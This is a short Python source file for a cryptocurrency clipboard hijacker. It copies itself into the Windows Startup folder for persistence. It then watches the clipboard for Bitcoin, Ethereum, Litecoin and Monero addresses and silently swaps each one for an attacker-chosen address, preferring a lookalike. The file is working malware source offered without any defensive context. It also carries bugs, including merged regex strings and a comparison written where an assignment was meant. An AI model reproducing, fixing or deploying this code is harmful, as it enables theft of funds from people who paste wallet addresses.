import time
import re
import difflib
import random
import os
import shutil


import pyperclip as pc

patterns = [
    '^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$', # bitcoin
    '^0x[a-zA-F0-9]{40}$', # Eth
    '[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}$' # Litecoin
    '^4([0-9]|[A-B])(.){93}$' # Monero
]

btc_address = [
    '',
]

eth_address = [
    '',
]

ltc_address = [
    '',
]

mon_address = [
    '',
]

def start_up():
    user = os.getlogin()
    basename = os.path.basename(__file__)
    shutil.copy(os.getcwd() + basename,'C:/Users/'+user+'/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/')

def clipper():
    while True:
        time.sleep(1)
        clipboard = str(pc.paste()) # Reads clipboard

        for pattern in patterns:
            if re.match(pattern, clipboard):
                index = patterns.index(pattern)

                if index == 0:
                    address_list = btc_address

                elif index == 1:
                    address_list = eth_address

                elif index == 2:
                    address_list == ltc_address

                elif index == 3:
                    address_list = mon_address

                match_address = difflib.get_close_matches(clipboard, address_list) # Finds a close match
                if str(match_address) == '[]': # If no close match is found chose a random address
                    match_address = random.choice(address_list)

                pc.copy(''.join(match_address)) # Copies the clipped address to clipbaord
                    

            else:
                pass


if  __name__  == '__main__':
    start_up() # Adds to start up
    clipper()
